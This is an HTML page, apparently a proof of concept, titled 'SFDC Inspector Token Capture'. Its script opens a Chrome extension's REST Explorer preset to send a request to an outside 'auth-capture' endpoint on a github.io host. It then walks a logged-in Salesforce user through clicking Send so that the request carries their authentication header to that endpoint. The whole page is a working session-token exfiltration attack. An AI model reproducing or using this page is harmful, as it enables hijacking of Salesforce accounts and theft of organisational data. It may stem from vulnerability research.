<!DOCTYPE html>
<html>
<head>
    <title>SFDC Inspector Token Capture</title>
    <style>
        body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
        .container { background: #f5f5f5; padding: 20px; border-radius: 4px; margin-bottom: 20px; }
        button { padding: 10px 20px; margin: 10px 0; cursor: pointer; }
        pre { white-space: pre-wrap; background: #eee; padding: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>SFDC Inspector Token Capture</h2>
        <p>Click below to open the REST Explorer:</p>
        <button onclick="openExplorer()">Open REST Explorer</button>
        <div id="status"></div>
    </div>

    <script>
        const statusDiv = document.getElementById('status');
        
        function openExplorer() {
            // Direct URL to REST Explorer with our capture endpoint
            const explorerUrl = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?endpoint=.samanattar.github.io/auth-capture&method=GET&format=json`;
            
            // Open in a new tab
            window.open(explorerUrl, '_blank');
            
            statusDiv.innerHTML = `
                <h3>REST Explorer Opened</h3>
                <p>Please follow these steps:</p>
                <ol>
                    <li>In the new tab that opened, wait for the REST Explorer to load</li>
                    <li>Click the "Send" button</li>
                    <li>The request will be sent to your capture endpoint with the authentication header</li>
                </ol>
            `;
        }

        // Show initial instructions
        statusDiv.innerHTML = `
            <h3>Instructions:</h3>
            <ol>
                <li>Make sure you're logged into Salesforce</li>
                <li>Click the "Open REST Explorer" button above</li>
                <li>In the new tab, click "Send" to make the request</li>
            </ol>
        `;
    </script>
</body>
</html>
